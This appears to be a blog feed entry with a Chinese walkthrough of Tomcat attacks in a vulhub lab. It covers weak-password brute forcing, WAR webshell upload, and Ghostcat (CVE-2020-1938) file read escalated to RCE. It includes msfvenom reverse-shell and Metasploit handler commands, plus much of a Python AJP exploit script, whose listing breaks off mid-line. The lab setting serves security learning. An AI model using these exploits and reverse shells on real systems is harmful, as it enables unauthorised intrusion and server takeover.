<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>梦~醒🥝</title>
  
  
  <link href="https://blog.m3x1.cn/atom.xml" rel="self"/>
  
  <link href="https://blog.m3x1.cn/"/>
  <updated>2025-03-28T07:08:45.608Z</updated>
  <id>https://blog.m3x1.cn/</id>
  
  <author>
    <name>梦~醒🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【vulhub漏洞靶场】tomcat漏洞及漏洞复现</title>
    <link href="https://blog.m3x1.cn/posts/a96128fe.html"/>
    <id>https://blog.m3x1.cn/posts/a96128fe.html</id>
    <published>2025-03-27T16:00:00.000Z</published>
    <updated>2025-03-28T07:08:45.608Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="tomcat8">tomcat8</h2><blockquote><p>kali靶机：192.168.192.132</p><p>win10攻击机：192.168.192.129</p></blockquote><h3 id="环境说明">环境说明</h3><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p><p>Tomcat7+权限分为：</p><ul><li>manager（后台管理）<ul><li>manager-gui 拥有html页面权限</li><li>manager-status 拥有查看status的权限</li><li>manager-script 拥有text接口的权限，和status权限</li><li>manager-jmx 拥有jmx权限，和status权限</li></ul></li><li>host-manager（虚拟主机管理）<ul><li>admin-gui 拥有html页面权限</li><li>admin-script 拥有text接口权限</li></ul></li></ul><h3 id="漏洞复现">漏洞复现</h3><p>靶机进入vulhub-master/tomcat/tomcat8,启动docker</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326165628798.png" alt="image-20250326165628798"></p><p>开启环境之后浏览器打开，如果不知道tomcat的后台管理页面为manager的话，在本环境中也可以自己摸索出登录框，点击图中任意三个请求之后也能发现登录框</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28ff0661acc62e0ea2101b28b2618fa2.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/415b65ab170d2bced11bac4a83b0dc4c.png" alt="img"></p><p>找到登录页面之后尝试tomcat的弱口令,先抓包发现一个base编码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327103117221.png" alt="image-20250327103117221"></p><p>解码发现：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327103239255.png" alt="image-20250327103239255"></p><p>然后知道了他传递账户密码的方式，就可以进行爆破了</p><p>爆破出来是tomcat:tomcat</p><p>之后就发现可以进行上传文件的操作</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5c38eb17fb273c5faedc1f3a0fab82ee.png" alt="img"></p><p>接下来先用哥斯拉生成一个jsp文件</p><p>然后用java命令，将它打包成war格式：（或者将jsp文件压缩成zip文件，然后修改后缀为war）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327111550121.png" alt="image-20250327111550121"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327111635208.png" alt="image-20250327111635208"></p><p>上传war包getshell，上传完成之后就可以看到多了一栏数据</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7b396b9105f6d2d1b7ffa12aaa272cb9.png" alt="img"></p><p>然后访问路径为/shell/shell.jsp，如果能访问成功，就说明成功了。</p><p>打开哥斯拉进行连接，成功拿到shell</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327112003498.png" alt="image-20250327112003498"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327112312284.png" alt="image-20250327112312284"></p><h2 id="CVE-2020-1938">CVE-2020-1938</h2><blockquote><p>kali靶机：192.168.192.132</p><p>kali攻击机：192.168.192.133</p></blockquote><p>Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。Ghostcat是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><p>tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP ：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell。</p><p>环境启动之后，进行端口扫描</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327202910328.png" alt="image-20250327202910328"></p><p>看到有个陌生的ajp13协议，搜索得知这是个定向包协议。因为性能原因，使用二进制格式来传输可读性文本。</p><blockquote><p><strong>AJP13</strong>是Apache Tomcat中使用的一种高效的二进制协议，它允许Web服务器与Servlet容器之间通过TCP连接进行通信。这种协议的设计目的是为了提高性能，因为它使用二进制格式传输可读性文本，从而减少了处理socket连接的开销。在AJP13协议中，Web服务器和Servlet容器之间尝试保持持久性的TCP连接，以便在多个请求/响应循环中重用同一个连接。这意味着，一旦连接被分配给特定请求，在请求处理结束之前，该连接不会再次分配给其他请求。</p></blockquote><p>访问8080端口，是个tomcat的页面。</p><p>接下来我们利用poc进行漏洞检测。若存在漏洞则可以查看webapps目录下的所有文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">cd CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/文件名 靶机ip   #py2环境</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327204718269.png" alt="image-20250327204718269"></p><p>看到能成功读取web.xml文件，就是验证了漏洞存在。</p><p>验证完成之后就可以进行漏洞利用的操作了</p><p>先在靶机利用msf生成一个jsp木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.192.133 LPORT=4444 R &gt;shell.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205509964.png" alt="image-20250327205509964"></p><p>接着把木马上传到docker容器中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp shell.txt ae1efd71d43f:/usr/local/tomcat/webapps/ROOT/WEB-INF/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205849367.png" alt="image-20250327205849367"></p><p>进入docker容器检查一下，出现shell.txt，说明上传成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -ti 容器id bash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205924843.png" alt="image-20250327205924843"></p><p>我们试着在攻击机上利用poc读取shell.txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/shell.txt 靶机ip   #py2环境</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327211933141.png" alt="image-20250327211933141"> 读取成功，实现了任意文件读取的漏洞验证。接下来进行漏洞利用来getshell。</p><p>上传完成之后，攻击机进入msf进行端口监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/jsp_shell_reverse_tcp</span><br><span class="line">set lhost 攻击机ip</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327210622683.png" alt="image-20250327210622683"></p><p>之后再利用exp进行反弹shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python CNVD-2020-10487-Tomcat-Ajp-lfi-rce.py -p 8009 192.168.192.132 --rce 1 -f /WEB-INF/shell.txt</span><br><span class="line">#注意这个exp是修改了的，不是原来的exp，源代码如下。需要使用python3运行，其他都差不多，多了一个--rce参数进行编译运行jsp文件。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># CNVD-2020-10487  Tomcat-Ajp lfi</span><br><span class="line"># by ydhcui</span><br><span class="line">import struct</span><br><span class="line">import io</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Some references:</span><br><span class="line"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span><br><span class="line">def pack_string(s):</span><br><span class="line">    if s is None:</span><br><span class="line">        return struct.pack(&quot;&gt;h&quot;, -1)</span><br><span class="line">    l = len(s)</span><br><span class="line">    return struct.pack(&quot;&gt;H%dsb&quot; % l, l, s.encode(&#x27;utf8&#x27;), 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def unpack(stream, fmt):</span><br><span class="line">    size = struct.calcsize(fmt)</span><br><span class="line">    buf = stream.read(size)</span><br><span class="line">    return struct.unpack(fmt, buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def unpack_string(stream):</span><br><span class="line">    size, = unpack(stream, &quot;&gt;h&quot;)</span><br><span class="line">    if size == -1:  # null string</span><br><span class="line">        return None</span><br><span class="line">    res, = unpack(stream, &quot;%ds&quot; % size)</span><br><span class="line">    stream.read(1)  # \0</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class NotFoundException(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpBodyRequest(object):</span><br><span class="line">    # server == web server, container == servlet</span><br><span class="line">    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><br><span class="line">    MAX_REQUEST_LENGTH = 8186</span><br><span class="line"></span><br><span class="line">    def __init__(self, data_stream, data_len, data_direction=None):</span><br><span class="line">        self.data_stream = data_stream</span><br><span class="line">        self.data_len = data_len</span><br><span class="line">        self.data_direction = data_direction</span><br><span class="line"></span><br><span class="line">    def serialize(self):</span><br><span class="line">        data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line">        if len(data) == 0:</span><br><span class="line">            return struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, 0x00)</span><br><span class="line">        else:</span><br><span class="line">            res = struct.pack(&quot;&gt;H&quot;, len(data))</span><br><span class="line">            res += data</span><br><span class="line">        if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, len(res))</span><br><span class="line">        else:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbH&quot;, 0x41, 0x42, len(res))</span><br><span class="line">        return header + res</span><br><span class="line"></span><br><span class="line">    def send_and_receive(self, socket, stream):</span><br><span class="line">        while True:</span><br><span class="line">            data = self.serialize()</span><br><span class="line">            socket.send(data)</span><br><span class="line">            r = AjpResponse.receive(stream)</span><br><span class="line">            while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">                r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line">            if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpForwardRequest(object):</span><br><span class="line">    _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(</span><br><span class="line">        28)</span><br><span class="line">    REQUEST_METHODS = &#123;&#x27;GET&#x27;: GET, &#x27;POST&#x27;: POST, &#x27;HEAD&#x27;: HEAD, &#x27;OPTIONS&#x27;: OPTIONS, &#x27;PUT&#x27;: PUT, &#x27;DELETE&#x27;: DELETE,</span><br><span class="line">                       &#x27;TRACE&#x27;: TRACE&#125;</span><br><span class="line">    # server == web server, container == servlet</span><br><span class="line">    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><br><span class="line">    COMMON_HEADERS = [&quot;SC_REQ_ACCEPT&quot;,</span><br><span class="line">                      &quot;SC_REQ_ACCEPT_CHARSET&quot;, &quot;SC_REQ_ACCEPT_ENCODING&quot;, &quot;SC_REQ_ACCEPT_LANGUAGE&quot;,</span><br><span class="line">                      &quot;SC_REQ_AUTHORIZATION&quot;,</span><br><span class="line">                      &quot;SC_REQ_CONNECTION&quot;, &quot;SC_REQ_CONTENT_TYPE&quot;, &quot;SC_REQ_CONTENT_LENGTH&quot;, &quot;SC_REQ_COOKIE&quot;,</span><br><span class="line">                      &quot;SC_REQ_COOKIE2&quot;,</span><br><span class="line">                      &quot;SC_REQ_HOST&quot;, &quot;SC_REQ_PRAGMA&quot;, &quot;SC_REQ_REFERER&quot;, &quot;SC_REQ_USER_AGENT&quot;</span><br><span class="line">                      ]</span><br><span class="line">    ATTRIBUTES = [&quot;context&quot;, &quot;servlet_path&quot;, &quot;remote_user&quot;, &quot;auth_type&quot;, &quot;query_string&quot;, &quot;route&quot;, &quot;ssl_cert&quot;,</span><br><span class="line">                  &quot;ssl_cipher&quot;, &quot;ssl_session&quot;, &quot;req_attribute&quot;, &quot;ssl_key_size&quot;, &quot;secret&quot;, &quot;stored_method&quot;]</span><br><span class="line"></span><br><span class="line">    def __init__(self, data_direction=None):</span><br><span class="line">        self.prefix_code = 0x02</span><br><span class="line">        self.method = None</span><br><span class="line">        self.protocol = None</span><br><span class="line">        self.req_uri = None</span><br><span class="line">        self.remote_addr = None</span><br><span class="line">        self.remote_host = None</span><br><span class="line">        self.server_name = None</span><br><span class="line">        self.server_port = None</span><br><span class="line">        self.is_ssl = None</span><br><span class="line">        self.num_headers = None</span><br><span class="line">        self.request_headers = None</span><br><span class="line">        self.attributes = None</span><br><span class="line">        self.data_direction = data_direction</span><br><span class="line"></span><br><span class="line">    def pack_headers(self):</span><br><span class="line">        self.num_headers = len(self.request_headers)</span><br><span class="line">        res = &quot;&quot;</span><br><span class="line">        res = struct.pack(&quot;&gt;h&quot;, self.num_headers)</span><br><span class="line">        for h_name in self.request_headers:</span><br><span class="line">            if h_name.startswith(&quot;SC_REQ&quot;):</span><br><span class="line">                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1</span><br><span class="line">                res += struct.pack(&quot;BB&quot;, 0xA0, code)</span><br><span class="line">            else:</span><br><span class="line">                res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">            res += pack_string(self.request_headers[h_name])</span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line">    def pack_attributes(self):</span><br><span class="line">        res = b&quot;&quot;</span><br><span class="line">        for attr in self.attributes:</span><br><span class="line">            a_name = attr[&#x27;name&#x27;]</span><br><span class="line">            code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1</span><br><span class="line">            res += struct.pack(&quot;b&quot;, code)</span><br><span class="line">            if a_name == &quot;req_attribute&quot;:</span><br><span class="line">                aa_name, a_value = attr[&#x27;value&#x27;]</span><br><span class="line">                res += pack_string(aa_name)</span><br><span class="line">                res += pack_string(a_value)</span><br><span class="line">            else:</span><br><span class="line">                res += pack_string(attr[&#x27;value&#x27;])</span><br><span class="line">        res += struct.pack(&quot;B&quot;, 0xFF)</span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line">    def serialize(self):</span><br><span class="line">        res = &quot;&quot;</span><br><span class="line">        res = struct.pack(&quot;bb&quot;, self.prefix_code, self.method)</span><br><span class="line">        res += pack_string(self.protocol)</span><br><span class="line">        res += pack_string(self.req_uri)</span><br><span class="line">        res += pack_string(self.remote_addr)</span><br><span class="line">        res += pack_string(self.remote_host)</span><br><span class="line">        res += pack_string(self.server_name)</span><br><span class="line">        res += struct.pack(&quot;&gt;h&quot;, self.server_port)</span><br><span class="line">        res += struct.pack(&quot;?&quot;, self.is_ssl)</span><br><span class="line">        res += self.pack_headers()</span><br><span class="line">        res += self.pack_attributes()</span><br><span class="line">        if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbh&quot;, 0x12, 0x34, len(res))</span><br><span class="line">        else:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbh&quot;, 0x41, 0x42, len(res))</span><br><span class="line">        return header + res</span><br><span class="line"></span><br><span class="line">    def parse(self, raw_packet):</span><br><span class="line">        stream = io.StringIO(raw_packet)</span><br><span class="line">        self.magic1, self.magic2, data_len = unpack(stream, &quot;bbH&quot;)</span><br><span class="line">        self.prefix_code, self.method = unpack(stream, &quot;bb&quot;)</span><br><span class="line">        self.protocol = unpack_string(stream)</span><br><span class="line">        self.req_uri = unpack_string(stream)</span><br><span class="line">        self.remote_addr = unpack_string(stream)</span><br><span class="line">        self.remote_host = unpack_string(stream)</span><br><span class="line">        self.server_name = unpack_string(stream)</span><br><span class="line">        self.server_port = unpack(stream, &quot;&gt;h&quot;)</span><br><span class="line">        self.is_ssl = unpack(stream, &quot;?&quot;)</span><br><span class="line">        self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.request_headers = &#123;&#125;</span><br><span class="line">        for i in range(self.num_headers):</span><br><span class="line">            code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">            if code &gt; 0xA000:</span><br><span class="line">                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]</span><br><span class="line">            else:</span><br><span class="line">                h_name = unpack(stream, &quot;%ds&quot; % code)</span><br><span class="line">                stream.read(1)  # \0</span><br><span class="line">            h_value = unpack_string(stream)</span><br><span class="line">            self.request_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">    def send_and_receive(self, socket, stream, save_cookies=False):</span><br><span class="line">        res = []</span><br><span class="line">        i = socket.sendall(self.serialize())</span><br><span class="line">        if self.method == AjpForwardRequest.POST:</span><br><span class="line">            return res</span><br><span class="line"></span><br><span class="line">        r = AjpResponse.receive(stream)</span><br><span class="line">        assert r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">        res.append(r)</span><br><span class="line">        if save_cookies and &#x27;Set-Cookie&#x27; in r.response_headers:</span><br><span class="line">            self.headers[&#x27;SC_REQ_COOKIE&#x27;] = r.response_headers[&#x27;Set-Cookie&#x27;]</span><br><span class="line"></span><br><span class="line">        # read body chunks and end response packets</span><br><span class="line">        while True:</span><br><span class="line">            r = AjpResponse.receive(stream)</span><br><span class="line">            res.append(r)</span><br><span class="line">            if r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">                break</span><br><span class="line">            elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                raise NotImplementedError</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpResponse(object):</span><br><span class="line">    _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)</span><br><span class="line">    COMMON_SEND_HEADERS = [</span><br><span class="line">        &quot;Content-Type&quot;, &quot;Content-Language&quot;, &quot;Content-Length&quot;, &quot;Date&quot;, &quot;Last-Modified&quot;,</span><br><span class="line">        &quot;Location&quot;, &quot;Set-Cookie&quot;, &quot;Set-Cookie2&quot;, &quot;Servlet-Engine&quot;, &quot;Status&quot;, &quot;WWW-Authenticate&quot;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    def parse(self, stream):</span><br><span class="line">        # read headers</span><br><span class="line">        self.magic, self.data_length, self.prefix_code = unpack(stream, &quot;&gt;HHb&quot;)</span><br><span class="line"></span><br><span class="line">        if self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">            self.parse_send_headers(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">            self.parse_send_body_chunk(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">            self.parse_end_response(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">            self.parse_get_body_chunk(stream)</span><br><span class="line">        else:</span><br><span class="line">            raise NotImplementedError</span><br><span class="line"></span><br><span class="line">    def parse_send_headers(self, stream):</span><br><span class="line">        self.http_status_code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.http_status_msg = unpack_string(stream)</span><br><span class="line">        self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.response_headers = &#123;&#125;</span><br><span class="line">        for i in range(self.num_headers):</span><br><span class="line">            code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">            if code &lt;= 0xA000:  # custom header</span><br><span class="line">                h_name, = unpack(stream, &quot;%ds&quot; % code)</span><br><span class="line">                stream.read(1)  # \0</span><br><span class="line">                h_value = unpack_string(stream)</span><br><span class="line">            else:</span><br><span class="line">                h_name = AjpResponse.COMMON_SEND_HEADERS[code - 0xA001]</span><br><span class="line">                h_value = 